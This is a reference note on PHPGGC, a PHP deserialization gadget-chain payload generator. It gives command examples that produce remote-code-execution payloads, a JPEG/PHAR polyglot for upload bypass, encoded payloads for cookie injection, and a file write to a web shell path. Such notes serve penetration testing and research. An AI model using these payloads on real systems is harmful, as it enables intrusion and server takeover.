# phpggc - PHP Generic Gadget Chains

**Author:** Julien Bongars\
**Date:** 2026-02-13 01:36:15\
**Path:**

---

## Description

Source: https://github.com/ambionics/phpggc

PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically. When encountering an unserialize on a website you don't have the code of, or simply when trying to build an exploit, this tool allows you to generate the payload without having to go through the tedious steps of finding gadgets and combining them. It can be seen as the equivalent of frohoff's ysoserial, but for PHP. Currently, the tool supports gadget chains such as: CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, Wordpress, Yii and ZendFramework.

## Quick Start

```bash
# PHPGGC Quick Reference
# https://github.com/ambionics/phpggc

# List all available gadget chains
./phpggc -l

# Filter chains by framework
./phpggc -l monolog

# Show info about a specific chain
./phpggc -i Monolog/RCE1

# Generate a basic serialized payload
./phpggc Monolog/RCE1 system 'id'

# Generate as a PHAR file
./phpggc -p phar -o exploit.phar Monolog/RCE1 system 'id'

# Generate as a JPEG/PHAR polyglot (for upload bypass)
./phpggc -pj legit.jpg -o exploit.jpg Monolog/RCE1 system 'id'

# Base64 encode the payload (for cookie/parameter injection)
./phpggc -b Monolog/RCE1 system 'id'

# Fast destruct — triggers gadget immediately on unserialize()
./phpggc -f Monolog/RCE1 system 'id'

# Chain encodings: base64 then double URL encode
./phpggc -b -u -u Monolog/RCE1 system 'id'
```

## Help comand

```bash
PHPGGC: PHP Generic Gadget Chains
---------------------------------

USAGE
  ./phpggc [-h|-l|-i|...] <GadgetChain> [arguments]

INFORMATION
  -h, --help Displays help
  -l, --list [filter] Lists available gadget chains
  -i, --information
     Displays information about a gadget chain

OUTPUT
  -o, --output <file>
     Outputs the payload to a file instead of standard output

PHAR
  -p, --phar <tar|zip|phar>
     Creates a PHAR file of the given format
  -pj, --phar-jpeg <file>
     Creates a polyglot JPEG/PHAR file from given image
  -pp, --phar-prefix <file>
     Sets the PHAR prefix as the contents of the given file.
     Generally used with -p phar to control the beginning of the generated file.
  -pf, --phar-filename <filename>
     Defines the name of the file contained in the generated PHAR (default: test.txt)

SESSION ENCODE
  -se, --session-encode
     Uses session_encode() instead of serialize() to generate the payload.

ENHANCEMENTS
  -f, --fast-destruct
     Applies the fast-destruct technique, so that the object is destroyed
     right after the unserialize() call, as opposed to at the end of the
     script
  -a, --ascii-strings
     Uses the 'S' serialization format instead of the standard 's' for non-printable chars.
     This replaces every non-ASCII value to an hexadecimal representation:
       s:5:"A<null_byte>B<cr><lf>"; -> S:5:"A\00B\09\0D";
     This is experimental and it might not work in some cases.
  -A, --armor-strings
     Uses the 'S' serialization format instead of the standard 's' for every char.
     This replaces every character to an hexadecimal representation:
       s:5:"A<null_byte>B<cr><lf>"; -> S:5:"\41\00\42\09\0D";
     This is experimental and it might not work in some cases.
     Note: Since strings grow by a factor of 3 using this option, the payload can get
     really long.
  -pub, --public-properties
     Attempts to convert references to protected or private properties within the serialized
     payload to public. The resulting payload should contain no null bytes and may be a little
     shorter.
     This is experimental and it might not work in some cases.
  -n, --plus-numbers <types>
     Adds a + symbol in front of every number symbol of the given type.
     For instance, -n iO adds a + in front of every int and object name size:
     O:3:"Abc":1:{s:1:"x";i:3;} -> O:+3:"Abc":1:{s:1:"x";i:+3;}
     Note: Since PHP 7.2, only i and d (float) types can have a +
  -w, --wrapper <wrapper>
     Specifies a file containing at least one wrapper functions:
       - process_parameters(array $parameters): called right before object is created
       - process_object(object $object): called right before the payload is serialized
       - process_serialized(string $serialized): called right after the payload is serialized

ENCODING
  -s, --soft   Soft URLencode
  -u, --url    URLencodes the payload
  -b, --base64 Converts the output into base64
  -j, --json   Converts the output into json
  Encoders can be chained, for instance -b -u -u base64s the payload,
  then URLencodes it twice

CREATION
  -N, --new <framework> <type>
    Creates the file structure for a new gadgetchain for given framework
    Example: ./phpggc -N Drupal RCE
  --test-payload
    Instead of displaying or storing the payload, includes vendor/autoload.php and unserializes the payload.
    The test script can only deserialize __destruct, __wakeup, __toString and PHAR payloads.
    Warning: This will run the payload on YOUR system !

EXAMPLES
  ./phpggc -l
  ./phpggc -l drupal
  ./phpggc Laravel/RCE1 system id
  ./phpggc SwiftMailer/FW1 /var/www/html/shell.php /path/to/local/shell.php
```
